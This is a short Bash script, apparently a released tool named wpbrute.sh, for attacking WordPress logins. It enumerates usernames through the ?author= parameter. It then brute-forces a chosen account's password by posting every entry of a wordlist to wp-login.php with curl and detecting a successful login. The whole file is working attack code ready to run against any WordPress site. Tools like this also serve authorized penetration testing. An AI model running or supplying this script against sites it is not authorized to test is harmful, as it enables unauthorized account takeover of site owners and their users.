#!/bin/bash

#
# --------------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# guelfoweb@gmail.com wrote this file. As long as you retain this notice you
# can do whatever you want with this stuff. If we meet some day, and you think
# this stuff is worth it, you can buy me a beer in return Gianni 'guelfoweb' Amato
# --------------------------------------------------------------------------------
#

# v.1.4
# update: 09/10/2020 (dd/mm/aaaa)

USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT=1
COOKIE=cookie-`date +%s`
COOKIE_PATH="/tmp/$COOKIE"

# Help
help_man(){
	echo -e "Arguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
	echo -e "User Enumeration:\n./wpbrute.sh --url=www.example.com\n\nPassword Bruteforce:\n./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt"
}


# Test wordpress url
test_url(){
	CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
	if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
}

# User Enumeration
user_enum(){
	echo "[+] Username or nickname enumeration"
	for i in {1..10} 
	do
		users=($(curl -s -A "$USER_AGENT" -L -i $WP_URL/?author=$i | grep "\/author\/.*\/?mode" | cut -d\/ -f3))
		if [[ $users ]]; then 
			echo $users 
			echo $WP_URL/?author=$i
		fi
	done
	exit
}

# ===================== START =====================

# Get arguments
args_array=( $@ )
len_args=${#args_array[@]}

# Check arguments
if [ "$len_args" -eq 1 ]; then
	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
	test_url
	user_enum
fi

if [ "$len_args" -ne 3 ]; then 
	help_man
	exit
else
	# Get value
	WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
	WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
	if [ ! -f "$WP_PASSWORD" ]; then echo "Wordlist not found: $WP_PASSWORD"; exit; fi
	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
	test_url
fi

# Get cookie
curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login.php > /dev/null

# Bruteforce
echo "[+] Bruteforcing user [$WP_ADMIN]"
cat "$WP_PASSWORD" | while read line;
	do {
		echo $line
		REQ=`curl -s -b "$COOKIE_PATH" -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`

		if [ "$REQ" == "" ]; then echo "The password is: $line"; rm "$COOKIE_PATH"; exit; fi
	}
	done

# Remove cookie
rm "$COOKIE_PATH" 2> /dev/null
